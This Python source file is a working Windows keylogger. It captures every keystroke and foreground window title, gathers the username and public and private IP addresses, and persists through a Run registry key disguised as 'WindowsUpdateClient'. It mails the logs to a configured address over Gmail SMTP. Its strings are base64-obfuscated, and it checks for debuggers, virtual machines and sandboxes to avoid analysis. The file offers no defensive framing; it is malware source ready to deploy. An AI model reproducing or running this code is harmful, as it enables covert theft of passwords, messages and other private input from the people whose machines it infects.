import os
import time
import socket
import smtplib
import threading
import winreg
import base64

from pynput.keyboard import Key, Listener
import win32gui
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import antidetect
import config
from obfuscation import deobf

fromAddr = config.EMAIL_SENDER
fromPswd = config.EMAIL_PASSWORD
toAddr = config.EMAIL_RECEIVER

_HDR  = "W1NUQVJUIE9GIExPR1Nd"
_FMT  = "ICogIERhdGUvVGltZToge30KICAqICBVc2VyLVByb2ZpbGU6IHt9CiAgKiAgUHVibGljLUlQOiB7fQogICogIFByaXZhdGUtSVA6IHt9Cgo="
_LFMT = "Clt7fV0gfiB7fTog"
_CHNK = "Ci0tLUVORCBPRiBDSFVOSy0tLQo="
_ESUB = "e30gLSB7fQ=="
_RKEY = "U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"
_RVAL = "V2luZG93c1VwZGF0ZUNsaWVudA=="
_PEXE = "cHl0aG9udy5leGUgInt9Ig=="

def debug_print(msg):
    if config.DEBUG:
        print(msg)

def simple_encrypt(data):
    if not config.ENCRYPT_LOGS:
        return data
    key = config.ENCRYPTION_KEY
    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def establish_persistence():
    if not config.PERSISTENCE:
        return
    try:
        path = os.path.realpath(__file__)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, deobf(_RKEY), 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, deobf(_RVAL), 0, winreg.REG_SZ, deobf(_PEXE).format(path))
        winreg.CloseKey(key)
    except Exception:
        pass

def backup_to_file(data):
    try:
        appdata = os.getenv(deobf("QVBQREFUQQ=="))
        encrypted_data = simple_encrypt(data)
        with open(os.path.join(appdata, config.LOG_FILE_NAME), "a") as f:
            f.write(encrypted_data + deobf(_CHNK))
    except Exception:
        pass

datetime = time.ctime(time.time())
user = os.path.expanduser("~").split("\\")[2]
try:
    import requests
    publicIP = requests.get(deobf("aHR0cHM6Ly9hcGkuaXBpZnkub3JnLw==")).text
except Exception:
    publicIP = "0.0.0.0"
privateIP = socket.gethostbyname(socket.gethostname())

initial_msg = deobf(_HDR) + deobf(_FMT).format(datetime, user, publicIP, privateIP)
logged_data = initial_msg
old_app = ""
timer = None
pressed_modifiers = set()

def on_press(key):
    global old_app, logged_data, timer
    current_time = time.time()
    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    if new_app == deobf("Q29ydGFuYQ=="):
        new_app = deobf("V2luZG93cyBTdGFydCBNZW51")
    if new_app != old_app and new_app != "":
        logged_data += deobf(_LFMT).format(time.ctime(current_time), new_app)
        old_app = new_app
    modifiers = [Key.shift, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r, Key.cmd]
    substitution = [
        deobf("S2V5LmVudGVy"), deobf("W0VOVEVSXSA="),
        deobf("S2V5LmJhY2tzcGFjZQ=="), deobf("W0JBQ0tTUEFDRV0g"),
        deobf("S2V5LnNwYWNl"), deobf("IA=="),
        deobf("S2V5LmFsdF9s"), deobf("W0FMVF0g"),
        deobf("S2V5LnRhYg=="), deobf("W1RBRl0g"),
        deobf("S2V5LmRlbGV0ZQ=="), deobf("W0RFTF0g"),
        deobf("S2V5LmN0cmxfbA=="), deobf("W0NUUkxdIA=="),
        deobf("S2V5LmxlZnQ="), deobf("W0xFRlQgQVJST1ddIA=="),
        deobf("S2V5LnJpZ2h0"), deobf("W1JJR0hUIEFSUk9XXSA="),
        deobf("S2V5LnNoaWZ0"), deobf("W1NISUZUXSA="),
        deobf("XHgxMw=="), deobf("W0NUUkwtU10g"),
        deobf("XHgxNw=="), deobf("W0NUUkwtV10g"),
        deobf("S2V5LmNhcHNfbG9jaw=="), deobf("W0NBUFMgTEtdIA=="),
        deobf("XHgwMQ=="), deobf("W0NUUkwtQV0g"),
        deobf("S2V5LmNtZA=="), deobf("W1dJTkRPV1MgS0VZXSA="),
        deobf("S2V5LnByaW50X3NjcmVlbg=="), deobf("W1BSTlQgU0NSXSA="),
        deobf("XHgwMw=="), deobf("W0NUUkwtQ10g"),
        deobf("XHgxNg=="), deobf("W0NUUkwtVl0g"),
    ]
    key_str = str(key).strip("'")
    if key in modifiers:
        if key not in pressed_modifiers:
            pressed_modifiers.add(key)
            if key_str in substitution:
                logged_data += substitution[substitution.index(key_str)+1]
            else:
                logged_data += key_str
    else:
        if key_str in substitution:
            logged_data += substitution[substitution.index(key_str)+1]
        else:
            logged_data += key_str

def on_release(key):
    global pressed_modifiers
    modifiers = [Key.shift, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r, Key.cmd]
    if key in modifiers:
        pressed_modifiers.discard(key)

def send_and_restart():
    send_email()
    global timer
    timer = threading.Timer(config.SEND_INTERVAL, send_and_restart)
    timer.start()

def send_email():
    global logged_data, timer
    timer = None
    if len(logged_data) > len(initial_msg):
        retries = 3
        success = False
        while retries > 0 and not success:
            try:
                subject = deobf(_ESUB).format(user, time.ctime(time.time()))
                msg = MIMEMultipart()
                msg.set_charset(deobf("dXRmLTg="))
                msg[deobf("RnJvbQ==")] = fromAddr
                msg[deobf("VG8=")] = toAddr
                msg[deobf("U3ViamVjdA==")] = subject
                msg.attach(MIMEText(logged_data, deobf("cGxhaW4=")))
                s = smtplib.SMTP_SSL(deobf("c210cC5nbWFpbC5jb20="), 465)
                s.login(fromAddr, fromPswd)
                s.sendmail(fromAddr, toAddr, msg.as_string())
                s.quit()
                logged_data = initial_msg
                success = True
            except Exception:
                retries -= 1
                time.sleep(5)
        if not success:
            backup_to_file(logged_data)

if __name__ == "__main__":
    if config.ANTIDETECT:
        cfg = {
            deobf("Y2hlY2tfZGVidWdnZXI="): config.CHECK_DEBUGGER,
            deobf("Y2hlY2tfdGltaW5n"): config.CHECK_TIMING,
            deobf("Y2hlY2tfdm0="): config.CHECK_VM,
            deobf("Y2hlY2tfc2FuZGJveA=="): config.CHECK_SANDBOX,
            deobf("dGhyZWF0X3RocmVzaG9sZA=="): config.THREAT_THRESHOLD,
        }
        safe, score, indicators = antidetect.should_run(cfg)
        if not safe and config.EXIT_SILENTLY:
            antidetect.fake_exit()
    establish_persistence()
    send_and_restart()
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
